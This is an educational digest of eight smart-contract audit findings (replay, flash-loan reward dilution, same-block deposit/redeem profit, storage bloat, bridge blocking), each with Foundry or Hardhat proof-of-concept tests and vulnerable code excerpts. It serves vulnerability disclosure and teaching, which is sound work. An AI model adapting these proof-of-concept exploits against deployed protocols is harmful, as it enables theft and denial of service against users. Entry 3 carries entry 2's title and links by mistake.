# ETAAcademy-Adudit: 1. Dos

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>01. DOS</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>dos</th>
          <td>dos</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Evta](https://twitter.com/pwhattie), looking forward to your joining

## 1. [Medium] EIP-155 is not enforced, allowing attackers/malicious operators to profit from replaying transactions

### Absence of enforcement of EIP-155

- Summary: Attackers and malicious operators profit from replaying transactions due to the absence of enforcement of **`EIP-155`**, which prevents replay attacks by including the chain ID in the transaction's signature.

- Impact & Recommendation: Attackers can replay transactions from networks not protected by EIP-155, while operators can replay early user transactions from other EVM networks to collect gas fees or profit directly.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-10-zksync#m-05-eip-155-is-not-enforced-allowing-attackersmalicious-operators-to-profit-from-replaying-transactions) & [Report](https://github.com/code-423n4/2023-10-zksync)

  <details><summary>POC</summary>

  ```rust

                  let should_check_chain_id = if matches!(
                    common_data.transaction_type,
                    TransactionType::LegacyTransaction
                ) && common_data.extract_chain_id().is_some()
                {
                    U256([1, 0, 0, 0])
                } else {
                    U256::zero()
                };
    pub fn extract_chain_id(&self) -> Option<u64> {
        let bytes = self.input_data()?;
        let chain_id = match bytes.first() {
            Some(x) if *x >= 0x80 => {
                let rlp = Rlp::new(bytes);
                let v = rlp.val_at(6).ok()?;
                PackedEthSignature::unpack_v(v).ok()?.1?
            }

  ```

  </details>

## 2. [Medium] Wrong ProfitManager in GuildToken, will always revert for other types of gauges leading to bad debt

### ProfitManagers in different markets

- Summary: In GuildToken.sol, setting profitManager in the constructor causes problems as different markets have different ProfitManagers. Calling `notifyPnL()` with negative values from other term types triggers `notifyGaugeLoss()`, leading to reverts because the caller differs from the constructor-set ProfitManager.

- Impact & Recommendation: In GuildToken.sol, ProfitManager should be dynamically called to accommodate different ProfitManagers for each market.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-10-wrong-profitmanager-in-guildtoken-will-always-revert-for-other-types-of-gauges-leading-to-bad-debt) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
    function testNotifyPnLCannotBeCalledWithNegative() public {
        // Show that for the initial gUSDC term there is no problem.
        credit.mint(address(profitManager), 10);
        profitManager.notifyPnL(term, -1);
        creditWETH.mint(address(profitManagerWETH), 10);
        vm.expectRevert("UNAUTHORIZED");
        profitManagerWETH.notifyPnL(termWETH, -1);
    }

  ```

  </details>

## 3. [Medium] Wrong ProfitManager in GuildToken, will always revert for other types of gauges leading to bad debt

### Staking and unstaking in the same block

- Summary: A borrower initiates a loan with the minimum amount in a term without mandatory partial repayment and transfers the funds to `EXPLOITER` after interest accrual. `EXPLOITER` then utilizes a flash loan to stake the amount into the same term via SurplusGuildMinter, repays the original loan, triggering `notifyPnL()`, which reduces rewards for other Guild holders by updating the `_gaugeProfitIndex`. Finally, `EXPLOITER` unstakes and returns the flash loan.

- Impact & Recommendation: To prevent attackers from instantly accumulating rewards without being long-term stakeholders like others in the system, several protective measures can be implemented. These include disallowing staking and unstaking in the same block, introducing staking/unstaking fees, or implementing a "warm-up period" during which stakers are unable to accumulate interest.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-12-ethereumcreditguild#m-10-wrong-profitmanager-in-guildtoken-will-always-revert-for-other-types-of-gauges-leading-to-bad-debt) & [Report](https://code4rena.com/reports/2023-12-ethereumcreditguild)

  <details><summary>POC</summary>

  ```solidity
    // SPDX-License-Identifier: GPL-3.0-or-later
    pragma solidity 0.8.13;
    import {Test, console} from "@forge-std/Test.sol";
    import {Core} from "@src/core/Core.sol";
    import {CoreRoles} from "@src/core/CoreRoles.sol";
    import {GuildToken} from "@src/tokens/GuildToken.sol";
    import {CreditToken} from "@src/tokens/CreditToken.sol";
    import {ProfitManager} from "@src/governance/ProfitManager.sol";
    import {MockLendingTerm} from "@test/mock/MockLendingTerm.sol";
    import {RateLimitedMinter} from "@src/rate-limits/RateLimitedMinter.sol";
    import {SurplusGuildMinter} from "@src/loan/SurplusGuildMinter.sol";
    contract DeflateGuildHoldersRewardsUnitTest is Test {
        address private governor = address(1);
        address private guardian = address(2);
        address private ALICE = makeAddr("alice");
        address private EXPLOITER = makeAddr("exploiter");
        address private STAKER1 = makeAddr("staker1");
        address private STAKER2 = makeAddr("staker2");
        address private STAKER3 = makeAddr("staker3");
        address private termUSDC;
        Core private core;
        ProfitManager private profitManagerUSDC;
        CreditToken gUSDC;
        GuildToken guild;
        RateLimitedMinter rlgm;
        SurplusGuildMinter sgmUSDC;
        // GuildMinter params
        uint256 constant MINT_RATIO = 2e18;
        uint256 constant REWARD_RATIO = 5e18;
        function setUp() public {
            vm.warp(1679067867);
            vm.roll(16848497);
            core = new Core();
            profitManagerUSDC = new ProfitManager(address(core));
            gUSDC = new CreditToken(address(core), "gUSDC", "gUSDC");
            guild = new GuildToken(address(core), address(profitManagerUSDC));
            rlgm = new RateLimitedMinter(
                address(core), /*_core*/
                address(guild), /*_token*/
                CoreRoles.RATE_LIMITED_GUILD_MINTER, /*_role*/
                type(uint256).max, /*_maxRateLimitPerSecond*/
                type(uint128).max, /*_rateLimitPerSecond*/
                type(uint128).max /*_bufferCap*/
            );
            sgmUSDC = new SurplusGuildMinter(
                address(core),
                address(profitManagerUSDC),
                address(gUSDC),
                address(guild),
                address(rlgm),
                MINT_RATIO,
                REWARD_RATIO
            );
            profitManagerUSDC.initializeReferences(address(gUSDC), address(guild), address(0));
            termUSDC = address(new MockLendingTerm(address(core)));
            // roles
            core.grantRole(CoreRoles.GOVERNOR, governor);
            core.grantRole(CoreRoles.GUARDIAN, guardian);
            core.grantRole(CoreRoles.CREDIT_MINTER, address(this));
            core.grantRole(CoreRoles.GUILD_MINTER, address(this));
            core.grantRole(CoreRoles.GAUGE_ADD, address(this));
            core.grantRole(CoreRoles.GAUGE_REMOVE, address(this));
            core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));
            core.grantRole(CoreRoles.GUILD_MINTER, address(rlgm));
            core.grantRole(CoreRoles.RATE_LIMITED_GUILD_MINTER, address(sgmUSDC));
            core.grantRole(CoreRoles.GUILD_SURPLUS_BUFFER_WITHDRAW, address(sgmUSDC));
            core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));
            core.renounceRole(CoreRoles.GOVERNOR, address(this));
            guild.setMaxGauges(10);
            guild.addGauge(1, termUSDC);
            // labels
            vm.label(address(core), "core");
            vm.label(address(profitManagerUSDC), "profitManagerUSDC");
            vm.label(address(gUSDC), "gUSDC");
            vm.label(address(guild), "guild");
            vm.label(address(rlgm), "rlcgm");
            vm.label(address(sgmUSDC), "sgmUSDC");
            vm.label(termUSDC, "termUSDC");
        }
        function testGuildHoldersRewardsWithoutEXPLOITER() public {
            // 3 users borrow gUSDC and stake them into the gUSDC term
            // In reality there may be more users, but for testing purposes, three are sufficient.
            gUSDC.mint(STAKER1, 200e18);
            gUSDC.mint(STAKER2, 800e18);
            gUSDC.mint(STAKER3, 600e18);
            vm.startPrank(STAKER1);
            gUSDC.approve(address(sgmUSDC), 200e18);
            sgmUSDC.stake(termUSDC, 200e18);
            vm.stopPrank();
            vm.startPrank(STAKER2);
            gUSDC.approve(address(sgmUSDC), 800e18);
            sgmUSDC.stake(termUSDC, 800e18);
            vm.stopPrank();
            vm.startPrank(STAKER3);
            gUSDC.approve(address(sgmUSDC), 600e18);
            sgmUSDC.stake(termUSDC, 600e18);
            vm.stopPrank();
            // Alice borrows 10 gUSDC. There's no borrow logic involved due to MockLendingTerm, but it's not necessary for the test.
            uint borrowTime = block.timestamp;
            gUSDC.mint(ALICE, 100e18);
            vm.warp(block.timestamp + 150 days);
            uint256 interest = _computeAliceLoanInterest(borrowTime, 100e18);
            vm.prank(governor);
            profitManagerUSDC.setProfitSharingConfig(
                0.05e18, // surplusBufferSplit
                0.9e18, // creditSplit
                0.05e18, // guildSplit
                0, // otherSplit
                address(0) // otherRecipient
            );
            gUSDC.mint(address(profitManagerUSDC), interest);
            profitManagerUSDC.notifyPnL(termUSDC, int256(interest));
            sgmUSDC.getRewards(STAKER1, termUSDC);
            sgmUSDC.getRewards(STAKER2, termUSDC);
            sgmUSDC.getRewards(STAKER3, termUSDC);
            console.log("------------------------------BEFORE ATTACK------------------------------");
            console.log("Staker1 credit reward:                                  ", gUSDC.balanceOf(address(STAKER1)));
            console.log("Staker1 guild reward:                                  ", guild.balanceOf(address(STAKER1)));
            console.log("Staker2 credit reward:                                 ", gUSDC.balanceOf(address(STAKER2)));
            console.log("Staker2 guild reward:                                  ", guild.balanceOf(address(STAKER2)));
            console.log("Staker3 credit reward:                                  ", gUSDC.balanceOf(address(STAKER3)));
            console.log("Staker3 guild reward:                                  ", guild.balanceOf(address(STAKER3)));
            console.log("GaugeProfitIndex:                                     ", profitManagerUSDC.gaugeProfitIndex(termUSDC));
        }
        function testGuildHoldersRewardsAfterEXPLOITER() public {
            gUSDC.mint(STAKER1, 200e18);
            gUSDC.mint(STAKER2, 800e18);
            gUSDC.mint(STAKER3, 600e18);
            vm.startPrank(STAKER1);
            gUSDC.approve(address(sgmUSDC), 200e18);
            sgmUSDC.stake(termUSDC, 200e18);
            vm.stopPrank();
            vm.startPrank(STAKER2);
            gUSDC.approve(address(sgmUSDC), 800e18);
            sgmUSDC.stake(termUSDC, 800e18);
            vm.stopPrank();
            vm.startPrank(STAKER3);
            gUSDC.approve(address(sgmUSDC), 600e18);
            sgmUSDC.stake(termUSDC, 600e18);
            vm.stopPrank();
            // Alice borrows 10 gUSDC. There's no borrow logic involved due to MockLendingTerm, but it's not necessary for the test.
            uint borrowTime = block.timestamp;
            gUSDC.mint(ALICE, 100e18);
            // NOTE: Alice needs to transfer the borrowed 100e18 gUSDC to EXPLOITER for repayment.

            console.log("-------------------------------AFTER ATTACK-------------------------------");
            console.log("EXPLOITER Credit Balance before flashloan:                              ", gUSDC.balanceOf(EXPLOITER));
            // EXPLOITER gets a flashloan.
            gUSDC.mint(EXPLOITER, 10_000_000e18);
            console.log("EXPLOITER Credit Balance after flashloan:      ", gUSDC.balanceOf(EXPLOITER));
            vm.startPrank(EXPLOITER);
            gUSDC.approve(address(sgmUSDC), 10_000_000e18);
            sgmUSDC.stake(termUSDC, 10_000_000e18);
            console.log("EXPLOITER Credit balance after stake:                                   ", gUSDC.balanceOf(EXPLOITER));
            vm.stopPrank();
            vm.warp(block.timestamp + 150 days);
            uint256 interest = _computeAliceLoanInterest(borrowTime, 100e18);
            vm.prank(governor);
            profitManagerUSDC.setProfitSharingConfig(
                0.05e18, // surplusBufferSplit
                0.9e18, // creditSplit
                0.05e18, // guildSplit
                0, // otherSplit
                address(0) // otherRecipient
            );
            profitManagerUSDC.notifyPnL(termUSDC, int256(interest));

            sgmUSDC.getRewards(EXPLOITER, termUSDC);
            console.log("EXPLOITER (instant) Credit reward:                     ", gUSDC.balanceOf(address(EXPLOITER)));
            console.log("EXPLOITER (instant) Guild reward:                     ", guild.balanceOf(address(EXPLOITER)));
            //EXPLOITER's profit is based on the guild split since he own almost all of the GUILD totalSupply.
            vm.startPrank(EXPLOITER);
            sgmUSDC.unstake(termUSDC, 10_000_000e18);
            vm.stopPrank();
            console.log("EXPLOITER credit balance after unstake:        ", gUSDC.balanceOf(EXPLOITER));
            // NOTE: EXPLOITER repays the flash loan here.
            sgmUSDC.getRewards(STAKER1, termUSDC);
            sgmUSDC.getRewards(STAKER2, termUSDC);
            sgmUSDC.getRewards(STAKER3, termUSDC);
            console.log("Staker1 credit reward:                                      ", gUSDC.balanceOf(address(STAKER1)));
            console.log("Staker1 guild reward:                                      ", guild.balanceOf(address(STAKER1)));
            console.log("Staker2 credit reward:                                     ", gUSDC.balanceOf(address(STAKER2)));
            console.log("Staker2 guild reward:                                      ", guild.balanceOf(address(STAKER2)));
            console.log("Staker3 credit reward:                                     ", gUSDC.balanceOf(address(STAKER3)));
            console.log("Staker3 guild reward:                                      ", guild.balanceOf(address(STAKER3)));
            console.log("GaugeProfitIndex:                                     ", profitManagerUSDC.gaugeProfitIndex(termUSDC));
        }
        // Function that will compute Alice's interest with which notifyPnL will be called so that the attack is as accurate as possible
        function _computeAliceLoanInterest(uint borrowTime, uint borrowAmount) private view returns (uint interest) {
            uint256 _INTEREST_RATE = 0.10e18; // 10% APR --- from LendingTerm tests
            uint256 YEAR = 31557600;
            interest = (borrowAmount * _INTEREST_RATE * (block.timestamp - borrowTime)) / YEAR / 1e18;
        }
    }

  ```

  </details>

## 4. [Medium] An attacker can bloat the Pink runtime storage with zero costs

### Bloat attack by dust accounts

- Summary: The Pink runtime's low Existential Deposit (ED) enables attackers to bloat storage with minimal cost by creating many low-balance accounts. This increases storage costs and fees for all users, posing a significant problem.

- Impact & Recommendation: Consider using a reasonable Existential Deposit. I recommend at least one CENTS (i.e. 1_000_000_000). When an account falls below the ED, it's removed from storage, resetting the nonce.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-phala-network#m-02-an-attacker-can-bloat-the-pink-runtime-storage-with-zero-costs) & [Report](https://code4rena.com/reports/2024-03-phala-network)

  <details><summary>POC</summary>

  ```rust
    -    pub const ExistentialDeposit: Balance = 1;
    +    pub const ExistentialDeposit: Balance = 1 * CENTS;

  ```

  </details>

## 5. [High] Users can get immediate profit when deposit and redeem in PerpetualAtlanticVaultLP

### Calculates shares before updating the total collateral

- Summary: When a user deposits assets, the function calculates shares before updating the total collateral. This creates an opportunity for users to exploit the difference in calculations and gain immediate profits by depositing and redeeming in the same block, potentially leading to sandwich and MEV attacks.

- Impact & Recommendation: Move  `perpetualAtlanticVault.updateFunding`  before  `previewDeposit`  is calculated.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-05-users-can-get-immediate-profit-when-deposit-and-redeem-in-perpetualatlanticvaultlp) & [Report](https://code4rena.com/reports/2023-08-dopex)

  <details><summary>POC</summary>

  ```solidity
      function testSandwichProvideFunding() public {
        rdpxV2Core.bond(20 * 1e18, 0, address(this));
        rdpxV2Core.bond(20 * 1e18, 0, address(this));
        skip(86400 * 7);
        vault.addToContractWhitelist(address(rdpxV2Core));
        vault.updateFundingPaymentPointer();
        // test funding successfully
        uint256[] memory strikes = new uint256[](1);
        strikes[0] = 15e6;
        // calculate funding is done properly
        vault.calculateFunding(strikes);
        uint256 funding = vault.totalFundingForEpoch(
            vault.latestFundingPaymentPointer()
        );
        // send funding to rdpxV2Core and call sync
        weth.transfer(address(rdpxV2Core), funding);
        rdpxV2Core.sync();
        rdpxV2Core.provideFunding();
        skip(86400 * 6);
        uint256 balanceBefore = weth.balanceOf(address(this));
        console.log("balance of eth before deposit and redeem:");
        console.log(balanceBefore);
        weth.approve(address(vaultLp), type(uint256).max);
        uint256 shares = vaultLp.deposit(1e18, address(this));
        vaultLp.redeem(shares, address(this), address(this));
        uint256 balanceAfter = weth.balanceOf(address(this));
        console.log("balance after deposit and redeem:");
        console.log(balanceAfter);
        console.log("immediate profit :");
        console.log(balanceAfter - balanceBefore);
    }

  ```

  </details>

## 6. [Medium] asdRouter.sol is at risk of DOS due to vulnerable implementation of NOTE address

### Hardcoding address

- Summary: The documentation advises using `CToken.underlying()` to ensure the correct NOTE token address. However, the current implementation in `asdRouter.sol` sets the noteAddress only at contract deployment, effectively hardcoding it. This poses a vulnerability as the `noteAddress` is used directly for swaps from asdUSDC to NOTE, instead of dynamically retrieving it via CToken.underlying(). Therefore, if the NOTE address changes, the `swap` and `lzcompose` functionalities will be vulnerable to denial-of-service attacks.

- Impact & Recommendation: use `CNote.underlying()` instead of hardcoding.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-canto#m-01-asdroutersol-is-at-risk-of-dos-due-to-vulnerable-implementation-of-note-address) & [Report](https://code4rena.com/reports/2024-03-canto)

  <details><summary>POC</summary>

  ```solidity
  //contracts/asd/asdRouter.sol
        constructor(address _noteAddress, uint32 _cantoLzEID, address _crocSwapAddress, address _crocImpactAddress, address _asdUSDCAddress) {
            //@audit No method to change noteAddress after deployment.
    |>      noteAddress = _noteAddress;
            cantoLzEID = _cantoLzEID;
            crocSwapAddress = _crocSwapAddress;
            crocImpactAddress = _crocImpactAddress;
            asdUSDC = _asdUSDCAddress;
        }

        //contracts/asd/asdRouter.sol
        function _swapOFTForNote(address _oftAddress, uint _amount, uint _minAmountNote) internal returns (uint, bool) {
    ...
            if (_oftAddress < noteAddress) {
                baseToken = _oftAddress;
    |>          quoteToken = noteAddress;
            } else {
    |>          baseToken = noteAddress;
                quoteToken = _oftAddress;
            }
    ...

  ```

  </details>

## 7. [Medium] The time available for a canceled withdrawal should not impact future unstaking processes

### Canceled withdrawal affects future unstaking processes

- Summary: When stakers attempt to unstake their StRSR, they cannot withdraw RSR immediately; instead, their withdrawal enters a queue and becomes available after an unstaking delay period. If a withdrawal is canceled, the RSR is restaked, but the canceled withdrawal still impacts future requests. For example, if a user cancels a withdrawal during a long unstaking delay, subsequent withdrawal requests might still be affected by the canceled request, making them available later than expected.

- Impact & Recommendation: This situation could lead to funds being locked for longer than intended and create a denial-of-service (DoS) issue for users. The logic for determining the availability of withdrawals should not consider canceled withdrawals. Specifically, the code should ensure that if a user cancels a withdrawal, it does not impact the availableAt time for new withdrawals.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-07-reserve#m-06-The-time-available-for-a-canceled-withdrawal-should-not-impact-future-unstaking-processes) & [Report](https://code4rena.com/reports/2024-07-reserve)

  <details><summary>POC</summary>

  ```solidity

      describe('PushDraft Test', () => {
      it('Should use current unstakingDelay', async () => {
        // old unstakingDelay is 1 day
        const oldUnstakingDelay = 3600 * 24
        await stRSR.connect(owner).setUnstakingDelay(oldUnstakingDelay)
        const amount: BigNumber = bn('100e18')
        await rsr.connect(addr1).approve(stRSR.address, amount)
        await stRSR.connect(addr1).stake(amount)

        const draftEra = 1
        const availableAtOfFirst = await getLatestBlockTimestamp() + oldUnstakingDelay + 1
        /**
         * Unstaking request enter a queue, and withdrawal become available 1 day later
         */
        await expect(stRSR.connect(addr1).unstake(amount))
          .emit(stRSR, 'UnstakingStarted')
          .withArgs(0, draftEra, addr1.address, amount, amount, availableAtOfFirst)

        /**
         * Cancel the unstaking to eliminate any pending withdrawals
         */
        await stRSR.connect(addr1).cancelUnstake(1)

        // new unstakingDelay is 1 hour
        const newUnstakingDelay = 3600
        await stRSR.connect(owner).setUnstakingDelay(newUnstakingDelay)

        await rsr.connect(addr2).approve(stRSR.address, amount)
        await stRSR.connect(addr2).stake(amount)

        const availableAtOfFirstOfUser2 = await getLatestBlockTimestamp() + newUnstakingDelay + 1
        /**
         * Unstaking request enter a queue, and withdrawal become available 1 hour later for a second user
         */
        await expect(stRSR.connect(addr2).unstake(amount))
          .emit(stRSR, 'UnstakingStarted')
          .withArgs(0, draftEra, addr2.address, amount, amount, availableAtOfFirstOfUser2)

        /**
         * Although the first unstaking was canceled, its available time still impacts subsequent unstaking requests
         */
        await expect(stRSR.connect(addr1).unstake(amount))
          .emit(stRSR, 'UnstakingStarted')
          .withArgs(1, draftEra, addr1.address, amount, amount, availableAtOfFirst)
      })
    })

  ```

  </details>

## 8. [High] Can block bridge or limit the bridgeable amount by initializing the ITSHub balance of the original chain

### Stop token bridging

- Summary: Attackers can block token bridging or limit the amount that can be bridged by manipulating the ITSHub balance on the original chain. The ITSHub tracks the token balances only on destination chains, not the original chain. This is because minting permissions are often registered on the original chain, making balance tracking complicated. However, attackers can initialize the original chain's balance to 0, which triggers an underflow error during token transfer, preventing tokens from being bridged out. In the InterchainTokenFactory,deployRemoteInterchainToken function, there is no check to prevent a token from being deployed back to the original chain, allowing attackers to deploy tokens from a remote chain to the original chain, causing the original chain's ITSHub balance to be initialized as zero. The ability to initialize the original chain’s balance to zero can stop token bridging or limit the amount that can be bridged. The issue is especially critical for canonical tokens, as attackers can prevent these tokens from being bridged out of the original chain, effectively locking the token in the original chain.

- Impact & Recommendation: While this issue does not involve stealing funds, it results in a DoS scenario, especially impacting canonical tokens. To prevent remote deployment requests to the original chain, `InterchainTokenFactory.deployRemoteInterchainToken` and `InterchainTokenFactory.deployRemoteCanonicalInterchainToken` should include checks to ensure that the destination chain is not the same as the original chain. When deploying directly through `InterchainTokenService.deployInterchainToken`, it's not possible to perform this check, so the original chain’s information should be stored for each tokenId in ITSHub. This will ensure that the balance of the original chain is not initialized, preventing issues related to balance manipulation and denial of service.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-08-axelar-network#h-02-can-block-bridge-or-limit-the-bridgeable-amount-by-initializing-the-itshub-balance-of-the-original-chain) & [Report](https://code4rena.com/reports/2024-08-axelar-network)

<details><summary>POC</summary>

```rust

  fn apply_balance_tracking(
    storage: &mut dyn Storage,
    source_chain: ChainName,
    destination_chain: ChainName,
    message: &ItsMessage,
  ) -> Result<(), Error> {

    match message {
        ItsMessage::InterchainTransfer {
            token_id, amount, ..
        } => {

                // Update the balance on the source chain
                update_token_balance(
                                storage,
                                token_id.clone(),
                                source_chain.clone(),
                                *amount,
                                false,
                            )
                .change_context_lazy(|| Error::BalanceUpdateFailed(source_chain, token_id.clone()))?;
                            // Update the balance on the destination chain

                update_token_balance(
                                storage,
                                token_id.clone(),
                                destination_chain.clone(),
                                *amount,
                                true,
                            )
                .change_context_lazy(|| {
                                Error::BalanceUpdateFailed(destination_chain, token_id.clone())
                            })?
            }

            // Start balance tracking for the token on the destination chain when a token deployment is seen
            // No invariants can be assumed on the source since the token might pre-exist on the source chain
            ItsMessage::DeployInterchainToken { token_id, .. } => {

                start_token_balance(storage, token_id.clone(), destination_chain.clone(), true)
                                .change_context(Error::InvalidStoreAccess)?
            }
            ...

        };

    Ok(())

}

```

</details>
